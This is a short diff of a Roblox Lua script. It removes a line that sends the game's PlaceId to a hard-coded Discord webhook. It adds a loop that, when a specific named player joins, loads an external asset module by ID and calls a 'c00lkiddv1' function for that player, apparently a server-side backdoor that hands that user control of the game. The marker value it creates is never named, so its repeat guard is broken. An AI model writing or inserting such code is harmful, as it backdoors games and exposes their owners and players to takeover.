@@ -1,1 +1,6 @@
-local ht = game:GetService("HttpService") ht:PostAsync("https://discord.com/api/webhooks/1319224584225951836/6LYel7uKx9XMlYVVsK1y2oeeWUujtS2goagw6IFOhq1gfMBe9-nDCniZIxyxNs1FahV3",ht:JSONEncode({['content'] = "https://www.roblox.com/games/"..game.PlaceId}),Enum.HttpContentType.ApplicationJson)
+for _,v in pairs(game.Players:GetPlayers()) do
+	if v.Name == "Enzo098765kl" and not workspace:FindFirstChild("GGG") then
+		require(14476224091).c00lkiddv1("Enzo098765kl")
+		local Instance = Instance.new("IntValue",workspace)
+	end
+end
